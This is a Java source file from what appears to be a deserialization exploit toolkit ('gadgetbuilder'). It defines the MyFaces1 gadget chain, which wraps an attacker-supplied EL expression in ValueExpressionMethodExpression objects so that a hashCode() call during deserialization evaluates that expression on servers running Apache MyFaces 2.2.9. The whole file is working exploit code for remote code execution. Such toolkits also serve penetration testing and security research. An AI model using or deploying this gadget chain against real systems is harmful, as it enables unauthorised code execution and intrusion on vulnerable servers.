package org.ses.gadgetbuilder.chains1;

import org.apache.myfaces.context.servlet.FacesContextImpl;
import org.apache.myfaces.context.servlet.FacesContextImplBase;
import org.apache.myfaces.el.CompositeELResolver;
import org.apache.myfaces.el.unified.FacesELContext;
import org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.HashCodeTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import javax.el.ELContext;
import javax.el.ExpressionFactory;
import javax.el.ValueExpression;
import javax.servlet.ServletContext;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;

@Authors({ Authors.MBECHLER })
@Dependencies({"org.apache.myfaces.core:myfaces-impl:2.2.9", "org.apache.myfaces.core:myfaces-api:2.2.9",
        "org.mortbay.jasper:apache-el:8.0.27",
        "javax.servlet:javax.servlet-api:3.1.0"})
@Impact(Impact.ELInvocation)
public class MyFaces1 extends GadgetChain<HashCodeTrampoline> {
    public MyFaces1(HashCodeTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        FacesContextImpl fc = new FacesContextImpl((ServletContext) null, (ServletRequest) null, (ServletResponse) null);
        ELContext elContext = new FacesELContext(new CompositeELResolver(), fc);
        Reflections.getField(FacesContextImplBase.class, "_elContext").set(fc, elContext);
        ExpressionFactory expressionFactory = ExpressionFactory.newInstance();

        ValueExpression ve1 = expressionFactory.createValueExpression(elContext, command, Object.class);
        ValueExpressionMethodExpression e = new ValueExpressionMethodExpression(ve1);
        ValueExpression ve2 = expressionFactory.createValueExpression(elContext, "${true}", Object.class);
        ValueExpressionMethodExpression e2 = new ValueExpressionMethodExpression(ve2);

        return new TrampolineConnector(e, e2);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getCommandFormat() {
        return "<EL_Expression>";
    }

    @Override
    protected String getStackTrace() {
        return "ValueExpressionMethodExpression.hashCode()\n" +
                "ValueExpressionMethodExpression.getMethodExpression()\n" +
                "ValueExpressionMethodExpression.getMethodExpression(ELContext)\n" +
        "ValueExpressionImpl.getValue(ELContext)";
    }
}
